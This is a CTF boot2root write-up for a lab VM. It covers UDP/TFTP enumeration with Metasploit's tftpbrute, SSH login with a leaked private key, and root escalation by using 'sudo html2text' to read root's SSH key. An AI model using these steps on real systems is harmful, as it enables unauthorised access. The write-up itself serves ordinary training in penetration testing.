# 0DAY-NPT by zikz

This is a team-based Capture The Flag event designed to assess your practical penetration testing skills through real-world simulation. Each challenge involves compromising a full machine, following a boot2root format.

# Machine 3 - Boot2Root Writeup

> Machine 3 of 5
> 

---

![image.png](image.png)

---

## 📝 Overview

This is part of a 5-machine boot2root series designed to simulate real-world penetration testing in a team-based CTF environment. This is the **3rd machine** in the sequence.

---

## 🔍 Target Details

- Machine Name: `0day#3`
- VM Platform: VMware
- IP Address: `192.168.222.134` (my local area network environment)

---

## 🎯 Objective

- Gain access to **standard user** and **escalate to root**.
- Retrieve:
    - 🧑‍💻 `user.txt`
    - 👑 `root.txt`

---

## 💡 Hints Provided (after 12:00)

### 🔍 View Hint: `1`

`port udp (check port udp)`

`tftpbrute*`

### 🔐 View Hint: `2`

`id_rsa & sshd_config`
`id_rsa can use for ssh`

## 🔍 User Flag Walkthrough

### 1. 🔎 **Reconnaissance (Recon)**

![image.png](image%201.png)

```bash
nmap 192.168.222.134 -sSVC -oA scan
```

| Option | Meaning |
| --- | --- |
| `192.168.222.134` | Target IP address to scan. |
| `-sS` | Stealth SYN scan (avoids full TCP connection, harder to detect). |
| `-V` | Version detection (checks what software runs on open ports). |
| `-C` | Runs default Nmap scripts (e.g., checks for vulnerabilities). |
| `-oA scan` | Saves output in 3 formats: `scan.nmap`, `scan.gnmap`, `scan.xml`. |

- Two open ports:
  - Port 22 (SSH): Running OpenSSH 8.4p1 on Debian
  - Port 80 (HTTP): Running Apache 2.4.56

After seeing the hint **`port udp (check port udp)`** and **`tftpbrute*`**, I researched and found that:

- TFTP (Trivial File Transfer Protocol) typically uses **UDP port 69**.
- **tftpbrute** is an **auxiliary scanner module** in Metasploit used to **enumerate files** on a TFTP server by brute-forcing common filenames.

```bash
nmap -sU -p 69 192.168.222.134
```

| Option | Meaning |
| --- | --- |
| `-sU` | UDP scan - scans for open UDP ports |
| `-p 69` | Specifies port 69 to scan |
| `192.168.222.134` | Target IP address to scan |

![image.png](image%202.png)

Port 69 (tftp) is open

---

### 2. 🌐 **Enumeration**

Found UDP port 69 open (TFTP). Used Metasploit's tftpbrute module to scan for files.

![image.png](image%203.png)

```bash
msfconsole
msf6 > use auxiliary/scanner/tftp/tftpbrute
msf6 auxiliary(scanner/tftp/tftpbrute) > set rhosts 192.168.222.134
msf6 auxiliary(scanner/tftp/tftpbrute) > run
[+] Found backup-config on 192.168.222.134
```

Downloaded the file using TFTP:

```bash
tftp 192.168.222.134
> get backup-config
> quit

```

![image.png](image%204.png)

Found a zip archive (backup-config) on the TFTP server. When extracted, it contained two key files:

- id_rsa - SSH private key
- sshd_config - SSH server configuration

These files are exactly what we need for SSH access to the machine.

After retrieving the `id_rsa` file and inspecting `sshd_config`, I found this configuration:

```markdown
Match User boris
PasswordAuthentication no
```

This means:

- The username is `boris`
- Password login is disabled for this user
- Only **key-based authentication** is allowed

---

### 3. 💥 **Exploitation**

✅ Used the private key to access SSH:

```bash
chmod 600 id_rsa
ssh boris@192.168.222.134 -i id_rsa
```

| Command | Explanation |
| --- | --- |
| `chmod 600 id_rsa` | Set file permission: only the owner can read/write the private key. |
| `ssh boris@192.168.222.134 -i id_rsa` | Use `id_rsa` as SSH key to login as user `boris` at IP `192.168.222.134`. |

![image.png](c3769405-108d-4f89-9d10-6877e1de90f4.png)

---

### 4. 🧑‍💻 **Post-Exploitation (User Level)**

After successful SSH login as `boris`, listed the contents:

```bash
boris@0day3:~$ ls -la
-r-------- 1 boris boris  23 Jul  28 19:38 user.txt
```

`ls -la` lists all files in the directory, including hidden ones, with detailed information.

Read the user flag:

```bash
boris@0day3:~$ cat user.txt
NPT{user_flag_here}
```

`cat user.txt` displays the contents of the `user.txt` file, which contains the user flag.

![image.png](7b14158b-a8eb-4a02-a115-00fb6d60e215.png)

---

## 🧭 Root Flag Walkthrough

### 1. 🔥 **Privilege Escalation**

Checked for sudo permissions:

```bash
boris@0day3:~$ sudo -l
```

The command `sudo -l` shows what commands the user can run as **root**.

![image.png](image%205.png)

This means I can run `html2text` as root

While exploring as user `boris`, I checked the `.ssh` folder:

![image.png](image%206.png)

I saw an `id_rsa` file inside and after comparing it, I noticed it's **the same private key** I originally got from the TFTP service.

This confirmed that the private key was indeed for user `boris`.

I remembered that I could run `html2text` as root (from `sudo -l`)
So I tried using it to read the **root’s private key**:

```bash
sudo /usr/bin/html2text /root/.ssh/id_rsa
```

![image.png](image%207.png)

The command printed the private key as plain text in the terminal.

At first, I tried copy-pasting the key directly into a file and using it with `ssh -i`, but it didn’t work because the format was broken.

Then I used this method (from AI help) to correctly paste and save the key:

```bash
cat > clean_root_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
(paste the key content here)
-----END RSA PRIVATE KEY-----
EOF

chmod 600 clean_root_key
```

| Line / Part | What It Does |
| --- | --- |
| `cat > clean_root_key << 'EOF'` | Create a file and start pasting multi-line text |
| `<< 'EOF'` | Stop pasting when the word `EOF` is typed |
| `-----BEGIN RSA PRIVATE KEY-----` to `-----END...` | Paste the full private key here |
| `EOF` (typed on its own line, then Enter) | Finish input and save the file  |
| `chmod 600 clean_root_key`                            | Set correct permissions for SSH to accept it |

![image.png](0d88f841-e20b-437f-8639-6f2ea3292d5d.png)

✅ Now the key is saved properly with correct permissions.

```bash
ssh -i clean_root_key root@192.168.222.134
```

![image.png](0cd25fae-ef7e-4c69-a0a0-acdc86b97bc0.png)

✅ Logs in to the target machine as `root` using the saved key. 

---

### 2. 🧑‍💻 **Post-Exploitation (Root Level)**

![image.png](image%208.png)

After logging in as `root`, I used the following command to check the contents of the root directory:

```bash
ls -la
```

I noticed a file named `r000000t.txt`, which looked like a flag file.

To view the content, I used:

```bash
cat /root/r000000t.txt
NPT{root_flag_here}
```

✅ This revealed the **root flag**, confirming full system access and successful completion of the challenge.
